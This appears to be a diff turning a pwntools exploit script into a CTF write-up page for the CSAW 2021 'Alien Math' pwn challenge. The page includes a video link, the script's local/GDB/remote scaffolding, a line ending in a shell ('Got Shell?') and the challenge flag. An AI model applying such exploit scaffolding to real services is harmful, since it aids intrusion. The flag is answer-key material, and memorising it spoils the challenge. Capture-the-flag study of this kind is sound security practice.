@@ -1,5 +1,35 @@
-from pwn import *
+---
+name: Alien Math (2021)
+event: CSAW CTF 2021
+category: Pwn
+description: Writeup for Alien Math (pwn) - CSAW CTF (2021) 💜
+layout:
+    title:
+        visible: true
+    description:
+        visible: true
+    tableOfContents:
+        visible: false
+    outline:
+        visible: true
+    pagination:
+        visible: true
+---
 
+# Alien Math
+
+## Video Walkthrough
+
+[![VIDEO](https://img.youtube.com/vi/1Dw21NoxXjE/0.jpg)](https://youtu.be/1Dw21NoxXjE?t=3701s "CSAW 2021: Alien Math")
+
+## Challenge Description
+
+> Brush off your Flirbgarple textbooks!
+
+## Solution
+
+```py
+from pwn import *
 
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
@@ -10,14 +40,12 @@ def start(argv=[], *a, **kw):
     else:  # Run locally
         return process([exe] + argv, *a, **kw)
 
-
 # Specify GDB script here (breakpoints etc)
 gdbscript = '''
 init-pwndbg
 break second_question_function
 continue
 '''.format(**locals())
-
 
 # Binary filename
 exe = './alien_math'
@@ -66,3 +94,6 @@ io.sendlineafter('How long does it take for a toblob of energy to be transferred
 
 # Got Shell?
 io.interactive()
+```
+
+Flag: `flag{w3fL15n1Rx!y0u_r34lLy_4R3@_fL1rBg@rpL3_m4573R!}`
